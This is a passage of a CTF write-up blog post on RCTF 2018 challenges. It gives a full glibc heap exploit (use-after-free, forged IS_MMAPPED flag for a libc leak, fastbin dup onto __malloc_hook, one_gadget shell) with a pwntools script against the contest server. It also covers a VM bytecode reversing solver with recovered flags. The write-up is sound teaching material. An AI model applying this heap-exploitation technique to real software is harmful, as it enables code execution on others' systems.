Normally, the GNU libc allocator asks the OS for memory (either through <code>sbrk</code> or <code>mmap</code>), and then hands out chunks of it to the application.
However, for particularly big allocations, the allocator will directly <code>mmap</code> the chunk and hand it out to the application.
This is signaled by the <code>IS_MMAPPED</code> flag in the chunk header.
Obviously, <code>mmap</code>ed memory is already zeroed by the OS, so <code>calloc</code> shouldn&rsquo;t need to clear it.
The <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=39e42989d32c0c3c1fd325f58dcc38ea7ee38364;hb=refs/heads/release/2.23/master#l3256" target=_blank>source code</a> confirms this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=nf>_int_malloc</span> <span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cm>/* ... */</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=nf>mem2chunk</span> <span class=p>(</span><span class=n>mem</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Two optional cases in which clearing not necessary */</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>chunk_is_mmapped</span> <span class=p>(</span><span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=n>perturb_byte</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>     <span class=k>return</span> <span class=nf>memset</span> <span class=p>(</span><span class=n>mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span></code></pre></div><p>Here, <code>chunk_is_mmapped</code> just checks whether <code>IS_MMAPPED</code> is set for the chunk.
Unless malloc&rsquo;s debug features are enabled (they&rsquo;re not here), <code>perturb_byte</code> is zero, so nothing is cleared.
We&rsquo;re not interested in real mmapped chunks (we can&rsquo;t allocate them anyway), but with some massaging we can exploit the UAF to edit a freed chunk&rsquo;s header and set the <code>IS_MMAPPED</code> flag.
If then <code>_int_malloc</code> returns our chunk to <code>__libc_calloc</code>, it won&rsquo;t be cleared.
Profit!</p><h3 class="relative group">Leaking libc<div id=leaking-libc class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#leaking-libc aria-label=Anchor>#</a></span></h3><p>We&rsquo;ll need to know libc&rsquo;s position in memory for further exploitation.
The typical way to leak libc through a heap leak is to read a link pointer from the first or the last chunk in the unsorted bin, as it will point inside <code>main_arena</code> in libc&rsquo;s data section.
So, in our case, we&rsquo;ll have to set <code>IS_MMAPPED</code> for an unsorted chunk, then allocate a string on top of it.
Clearly, we don&rsquo;t want this allocation to mess with the flag we just set.
The best path to take is an <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=39e42989d32c0c3c1fd325f58dcc38ea7ee38364;hb=refs/heads/release/2.23/master#l3516" target=_blank>exact fit</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* Take now instead of binning if exact fit */</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>size</span> <span class=o>==</span> <span class=n>nb</span><span class=p>)</span>
</span></span><span class=line><span class=cl> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nf>set_inuse_bit_at_offset</span> <span class=p>(</span><span class=n>victim</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>if</span> <span class=p>(</span><span class=n>av</span> <span class=o>!=</span> <span class=o>&amp;</span><span class=n>main_arena</span><span class=p>)</span>
</span></span><span class=line><span class=cl>     <span class=n>victim</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>|=</span> <span class=n>NON_MAIN_ARENA</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=nf>check_malloced_chunk</span> <span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>victim</span><span class=p>,</span> <span class=n>nb</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=kt>void</span> <span class=o>*</span><span class=n>p</span> <span class=o>=</span> <span class=nf>chunk2mem</span> <span class=p>(</span><span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=nf>alloc_perturb</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>bytes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=p>}</span>
</span></span></code></pre></div><p>So this is what we&rsquo;ll do (I chose the smallest sizes possible - string size is 8 bytes less than chunk size):</p><ol><li>Allocate a 0xB0 smallchunk (call it <code>dangling</code>), followed by a 0x20 fastchunk (to avoid consolidation of free chunks with the top chunk);</li><li>Free <code>dangling</code>: this sets up the UAF to corrupt the flags;</li><li>Allocate a 0x20 fastchunk (call it <code>spacer</code>), followed by a 0x90 smallchunk (call it <code>victim</code>) - note that those exactly fill <code>dangling</code>;</li><li>Free <code>victim</code>, which goes into the unsorted bin;</li><li>Edit <code>dangling</code> (its saved length is big enough to reach <code>victim</code>), incrementing the LSB of <code>victim</code>&rsquo;s size (offset 0x18) twice to set <code>IS_MMAPPED</code> - that&rsquo;s why we needed <code>spacer</code>, otherwise <code>victim</code>&rsquo;s header would&rsquo;ve been before the string data;</li><li>Allocate a 0x90 chunk with <code>\n</code> content, which will exactly fit into <code>victim</code>, and watch the challenge spew out a libc address (the LSB is corrupted to <code>\n</code>, but that&rsquo;s irrelevant).</li></ol><h3 class="relative group">Getting a shell<div id=getting-a-shell class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#getting-a-shell aria-label=Anchor>#</a></span></h3><p>Now that we have libc, there are a bunch of attacks we can do to gain code execution.
I chose to allocate a fake fastchunk on top of <code>__malloc_hook</code> and jump to a onegadget to pop a shell.
Because the memory around <code>__malloc_hook</code> contains library function pointers (0x7F top byte) and NULL pointers, interpreting the data at <code>&__malloc_hook-27</code> as a quadword yields 0x7F, which is a valid fastchunk header for the 0x70 fastbin.
Let&rsquo;s start with a fastbin dup through the UAF.
We allocate two 0x70 fastchunks (<code>dup</code> and <code>mid</code>), then free <code>dup</code>, <code>mid</code>, and <code>dup</code> again, thus bypassing the fastbin double-free checks.
The fastbin freelist is now <code>dup -> mid -> dup</code>.
Now we allocate a 0x70 fastchunk (which will reuse <code>dup</code>) and set the <code>fd</code> pointer to <code>&__malloc_hook-27-8</code> (accounting for <code>prev_size</code>).
The fastbin freelist is now <code>mid -> dup -> &__malloc_hook-27-8</code>.
We just need a couple 0x70 allocations to get the first two out of the way, and the next allocation will return our fake chunk, allowing us to overwrite <code>__malloc_hook</code>.
One more allocation to trigger the hook, and we have a shell!</p><pre tabindex=0><code>$ cat flag
RCTF{Is_th1s_c1-1unk_m4pped?_df3ac9}
</code></pre><h3 class="relative group">Exploit code<div id=exploit-code-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-code-2 aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;stringer.2018.teamrois.cn&#39;</span><span class=p>,</span> <span class=mi>7272</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;choice: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>alloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>final</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>chunk_idx</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;length: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>final</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;content: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span> <span class=o>+</span> <span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span> <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>size</span> <span class=k>else</span> <span class=s1>&#39;&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;your string: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>1.&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>chunk_idx</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>chunk_idx</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>increment_byte</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>offset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>offset</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Leaking libc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dangling</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0xa8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># stop consolidation with top chunk</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dangling</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># spacer</span>
</span></span><span class=line><span class=cl><span class=n>victim</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>victim</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># set IS_MMAPPED on freed victim</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>increment_byte</span><span class=p>(</span><span class=n>dangling</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># exact fit into victim unsorted</span>
</span></span><span class=line><span class=cl><span class=n>_</span><span class=p>,</span> <span class=n>leak</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x3c4b0a</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;@ 0x</span><span class=si>{:012x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Double-freeing fastchunk&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dup</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>mid</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Linking fake chunk&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>malloc_hook</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x3c4b10</span>
</span></span><span class=line><span class=cl><span class=n>fake_fast_addr</span> <span class=o>=</span> <span class=n>malloc_hook</span> <span class=o>-</span> <span class=mi>27</span> <span class=o>-</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_fast_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>)</span> <span class=c1># remove mid</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>)</span> <span class=c1># remove dup</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Overwriting __malloc_hook&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0xf02a4</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>19</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Popping shell&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>alloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=n>final</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">Simple vm<div id=simple-vm class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#simple-vm aria-label=Anchor>#</a></span></h2><p>We&rsquo;re given two files, a vm and a bytecode. By disassembling the vm it&rsquo;s easy to see what each instruction does and how it&rsquo;s saved in memory - it&rsquo;s all in <code>sub_400896</code>. As the function itself is quite long I won&rsquo;t copy it here, it&rsquo;s enough to see what each instruction does. In the following table, all items in <code>&lt;</code> and <code>></code> brackets are the values given right after the opcode.</p><table><thead><tr><th style=text-align:center>opcode</th><th style=text-align:center>size in bytes</th><th>description</th></tr></thead><tbody><tr><td style=text-align:center>00</td><td style=text-align:center>5</td><td><code>exit(&lt;exitcode>)</code></td></tr><tr><td style=text-align:center>01</td><td style=text-align:center>5</td><td><code>jump &lt;address></code></td></tr><tr><td style=text-align:center>02</td><td style=text-align:center>9</td><td><code>mov *&lt;address>, &lt;value></code></td></tr><tr><td style=text-align:center>03</td><td style=text-align:center>5</td><td><code>c = *&lt;address></code></td></tr><tr><td style=text-align:center>04</td><td style=text-align:center>5</td><td><code>*&lt;address> = c</code></td></tr><tr><td style=text-align:center>05</td><td style=text-align:center>5</td><td><code>d = *&lt;address></code></td></tr><tr><td style=text-align:center>06</td><td style=text-align:center>5</td><td><code>*&lt;address> = d</code></td></tr><tr><td style=text-align:center>07</td><td style=text-align:center>1</td><td><code>c += d</code></td></tr><tr><td style=text-align:center>08</td><td style=text-align:center>1</td><td><code>c = ~(c & d)</code></td></tr><tr><td style=text-align:center>09</td><td style=text-align:center>1</td><td>Unused</td></tr><tr><td style=text-align:center>0A</td><td style=text-align:center>1</td><td><code>c = getchar()</code></td></tr><tr><td style=text-align:center>0B</td><td style=text-align:center>1</td><td><code>putchar(c)</code></td></tr><tr><td style=text-align:center>0C</td><td style=text-align:center>9</td><td><code>if(*&lt;address> != 0) { *&lt;address> -= 1; jump &lt;target> }</code></td></tr><tr><td style=text-align:center>0D</td><td style=text-align:center>1</td><td><code>c += 1</code></td></tr><tr><td style=text-align:center>0E</td><td style=text-align:center>1</td><td><code>d += 1</code></td></tr><tr><td style=text-align:center>0F</td><td style=text-align:center>1</td><td><code>c = d</code></td></tr><tr><td style=text-align:center>10</td><td style=text-align:center>1</td><td><code>d = c</code></td></tr><tr><td style=text-align:center>11</td><td style=text-align:center>5</td><td><code>c += &lt;value></code></td></tr><tr><td style=text-align:center>12</td><td style=text-align:center>1</td><td><code>c = *d</code></td></tr><tr><td style=text-align:center>13</td><td style=text-align:center>1</td><td><code>c = *c</code></td></tr><tr><td style=text-align:center>14</td><td style=text-align:center>5</td><td><code>c = &lt;value></code></td></tr><tr><td style=text-align:center>15</td><td style=text-align:center>5</td><td><code>d = &lt;value></code></td></tr><tr><td style=text-align:center>16</td><td style=text-align:center>1</td><td><code>*d = c</code></td></tr><tr><td style=text-align:center>17</td><td style=text-align:center>1</td><td><code>c -= d</code></td></tr><tr><td style=text-align:center>18</td><td style=text-align:center>5</td><td><code>if(c != 0) { jump &lt;target> }</code></td></tr><tr><td style=text-align:center>66</td><td style=text-align:center>1</td><td>Implicitly used as a nop</td></tr></tbody></table><p><code>c</code> and <code>d</code> are the two registers the vm can work with.</p><p>Having a full instruction mapping, I disassembled the given bytecode into this:</p><pre tabindex=0><code># All values are hex

000: jmp 030

005: encoded data

030: d = 100
035: d++
036: c = *d
037: putchar(c)
038: if byte *100:
         dec byte *100
                 jmp 035
041: nop

042: d = 110
047: d += 1
048: c = getchar()
049: nop
04A: *d = c
04B: if byte *110:
         dec byte *110
                 jmp 047
054: nop

055: c = *140
05A: d = c
05B: c += F1
060: c = *c
061: *143 = c
066: c = ~(c &amp; d)
067: *141 = c
06C: d = c
06D: c = *140
072: c = ~(c &amp; d)
073: *142 = c
078: c = *141
07D: c = *143
082: c = ~(c &amp; d)
083: d = c
084: c = *142
089: c = ~(c &amp; d)
08A: *144 = c
08F: nop
090: c = *140
095: c += 0xF1
09A: d = c
09B: c = *144
0A0: *d = c
0A1: d = *140
0A6: d += 1
0A7: *140 = d
0AC: if byte *145:
         dec byte *145
                 jmp 055
0B5: nop
0B6: c = *146
0BB: c += 5
0C0: c = *c
0C1: d = c
0C2: c = *146
0C7: c += 111
0CC: c = *c
0CD: c -= d
0CE: if c:
         jmp 160
0D3: if byte *146:
         dec byte *146:
                 jmp 0B6
0DC: jmp 176

101: &#39;Input Flag:&#39;
151: &#39;Wrong&#39;
157: &#39;Right&#39;

160: d = 150
165: d += 1
166: c = *d
167: putchar(c)
168: if byte *150:
         dec byte *150
                 jmp 165
171: exit(0)

176: d = 156
17B: d += 1
17C: c = *d
17D: putchar(c)
17E: if byte *150:
         dec byte *150
                 jmp 17B
187: exit(0)
</code></pre><p>The code reads the flag into offset 0x111, transforms it in instructions 055-0B5 and compares it to the encrypted data at 005, jumping to 176 and printing <code>Right</code> if the flag is correct. We converted the transformation into a python function to find each individual character of the flag. Since each one was checked individually we could bruteforce each one and build up our result with the following code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>transform</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>pos</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>m140</span> <span class=o>=</span> <span class=mh>0x20</span> <span class=o>+</span> <span class=n>pos</span>
</span></span><span class=line><span class=cl>        <span class=n>m141</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>c</span> <span class=o>&amp;</span> <span class=n>m140</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>m142</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>m140</span> <span class=o>&amp;</span> <span class=n>m141</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>m144</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>m142</span> <span class=o>&amp;</span> <span class=o>~</span><span class=p>(</span><span class=n>m141</span> <span class=o>&amp;</span> <span class=n>c</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>m144</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;p.bin&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>magic</span> <span class=o>=</span> <span class=nb>map</span><span class=p>(</span><span class=nb>ord</span><span class=p>,</span> <span class=n>code</span><span class=p>[</span><span class=mi>5</span><span class=p>:</span><span class=mi>5</span><span class=o>+</span><span class=mi>32</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>pos</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>transform</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>pos</span><span class=p>)</span> <span class=o>==</span> <span class=n>magic</span><span class=p>[</span><span class=n>pos</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                        <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></div><p>Which outputs <code>09a71bf084a93df7ce3def3ab1bd61f6</code>. The flag is thus <code>RCTF{09a71bf084a93df7ce3def3ab1bd61f6}</code></p><h2 class="relative group">Babyre<div id=babyre class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#babyre aria-label=Anchor>#</a></span></h2><p>We are given two files, a 32 bit executable and a file called <code>out</code>. At first the program doesn&rsquo;t print anything when executed, but by opening it in a disassembler it&rsquo;s easy to see that it accepts a string and then a number, which has to be between 10 and 32. I started playing around with these two inputs only to realize they weren&rsquo;t actually used in producing the output.</p><h4 class="relative group">sub_80488E0<div id=sub_80488e0 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#sub_80488e0 aria-label=Anchor>#</a></span></h4><p>This is where the magic happens. The function reads a string and mangles each of the characters to a 32 bit integer, which is then printed in hex.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_80488E0</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>s</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a2</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a3</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a4</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a5</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// ST4C_4
